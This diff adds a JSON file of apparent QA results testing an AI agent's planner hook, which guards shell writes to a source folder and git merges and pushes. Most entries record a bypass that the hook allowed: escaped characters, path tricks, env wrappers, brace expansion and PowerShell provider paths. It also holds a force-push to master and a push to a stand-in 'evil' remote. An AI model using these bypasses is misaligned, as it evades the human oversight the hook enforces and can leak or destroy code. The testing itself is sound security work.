@@ -1,0 +1,356 @@
+{
+ "P1 bash `s\\rc` escape in target": {
+  "tool": "bash",
+  "command": "echo x > open-brain/s\\rc/x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `open\\-brain` escape in cp dest": {
+  "tool": "bash",
+  "command": "cp a.ts open\\-brain/src/x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1-only-if bash unquoted `open-brain\\src\\x.ts` (bash writes open-brainsrcx.ts in the root)": {
+  "tool": "bash",
+  "command": "echo x > open-brain\\src\\x.ts",
+  "hook": "deny",
+  "reason": "Planner hook: denied — planner.md, \"Authority\" / state changes go through `ob_state` via Bash write (open-brain\\src\\x.ts). Static write detection only (Bash and PowerShell): redirects, sed -i, tee, cp, mv and install targets, and the PowerShell cmdlets Set-Content, Add-Content, Out-File, New-Item, C",
+  "shell": {
+   "wroteUnderSrc": [],
+   "otherFilesInRoot": [
+    "open-brainsrcx.ts"
+   ],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `/dev/../<root>/open-brain/src/x.ts`": {
+  "tool": "bash",
+  "command": "echo x > /dev/../c/qa-scratch/qa237-fx/open-brain/src/x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `nice -n 5 cp`": {
+  "tool": "bash",
+  "command": "nice -n 5 cp a.ts open-brain/src/x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `env -u FOO cp`": {
+  "tool": "bash",
+  "command": "env -u FOO cp a.ts open-brain/src/x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `env --chdir=open-brain/src cp ../../a.ts x.ts`": {
+  "tool": "bash",
+  "command": "env --chdir=open-brain/src cp ../../a.ts x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `env -C open-brain/src tee x.ts`": {
+  "tool": "bash",
+  "command": "echo x | env -C open-brain/src tee x.ts > /dev/null",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 bash `$((1<<2))` then a write on the next line": {
+  "tool": "bash",
+  "command": "echo $((1<<2))\ncp a.ts open-brain/src/x.ts\n",
+  "hook": "deny",
+  "reason": "Planner hook: denied — planner.md, \"Authority\" / state changes go through `ob_state` via Bash write (open-brain/src/x.ts). Static write detection only (Bash and PowerShell): redirects, sed -i, tee, cp, mv and install targets, and the PowerShell cmdlets Set-Content, Add-Content, Out-File, New-Item, C",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P1 PS drive-relative `Set-Content C:open-brain/src/x.ts`": {
+  "tool": "ps",
+  "command": "Set-Content C:open-brain/src/x.ts x",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `FileSystem::<root>\\open-brain\\src\\x.ts`": {
+  "tool": "ps",
+  "command": "Set-Content FileSystem::C:\\qa-scratch\\qa237-fx\\open-brain\\src\\x.ts x",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `Microsoft.PowerShell.Core\\FileSystem::...`": {
+  "tool": "ps",
+  "command": "Set-Content -Path Microsoft.PowerShell.Core\\FileSystem::C:/qa-scratch/qa237-fx/open-brain/src/x.ts -Value x",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS quoted comma list `-Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts'`": {
+  "tool": "ps",
+  "command": "Set-Content -Path 'C:/qa-tmp/y.txt','open-brain/src/x.ts' -Value x",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `-Path ('open-brain/src/x.ts')`": {
+  "tool": "ps",
+  "command": "Set-Content -Path ('open-brain/src/x.ts') -Value x",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P3 PS `powershell -Comman \"Set-Content ...\"`": {
+  "tool": "ps",
+  "command": "powershell -NoProfile -Comman \"Set-Content open-brain/src/x.ts x\"",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "LIMIT PS `Export-Csv -Path open-brain/src/x.ts`": {
+  "tool": "ps",
+  "command": "Get-Date | Export-Csv -Path open-brain/src/x.ts",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "wroteUnderSrc": [
+    "x.ts"
+   ],
+   "otherFilesInRoot": [],
+   "exit": 0,
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr m\\erge 2`": {
+  "tool": "bash",
+  "command": "gh pr m\\erge 2",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr \\<newline>merge 2`": {
+  "tool": "bash",
+  "command": "gh pr \\\nmerge 2",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr $'merge' 2`": {
+  "tool": "bash",
+  "command": "gh pr $'merge' 2",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh pr {merge,} 2`": {
+  "tool": "bash",
+  "command": "gh pr {merge,} 2",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `X=merge; gh pr $X 2`": {
+  "tool": "bash",
+  "command": "X=merge; gh pr $X 2",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2 bash `gh $(echo pr) merge 2`": {
+  "tool": "bash",
+  "command": "gh $(echo pr) merge 2",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"gh\",\"pr\",\"merge\",\"2\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git mer\\ge feature`": {
+  "tool": "bash",
+  "command": "git mer\\ge feature",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"merge\",\"feature\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git {merge,} feature`": {
+  "tool": "bash",
+  "command": "git {merge,} feature",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"merge\",\"feature\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git \\<newline>merge feature`": {
+  "tool": "bash",
+  "command": "git \\\nmerge feature",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"merge\",\"feature\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git pu\\sh --force origin master`": {
+  "tool": "bash",
+  "command": "git pu\\sh --force origin master",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"push\",\"--force\",\"origin\",\"master\"]",
+   "stderr": ""
+  }
+ },
+ "P2b PS `git push origin loop/x,master`": {
+  "tool": "ps",
+  "command": "git push origin loop/x,master",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"push\",\"origin\",\"loop/x,master\"]",
+   "stderr": ""
+  }
+ },
+ "P2b PS `git push origin loop/x,--force`": {
+  "tool": "ps",
+  "command": "git push origin loop/x,--force",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"push\",\"origin\",\"loop/x,--force\"]",
+   "stderr": ""
+  }
+ },
+ "P2b bash `git -c remote.origin.url=https://github.com/evil/x push origin loop/x`": {
+  "tool": "bash",
+  "command": "git -c remote.origin.url=https://github.com/evil/x push origin loop/x",
+  "hook": "allow",
+  "reason": "",
+  "shell": {
+   "argv": "[\"git\",\"-c\",\"remote.origin.url=https://github.com/evil/x\",\"push\",\"origin\",\"loop/x\"]",
+   "stderr": ""
+  }
+ }
+}
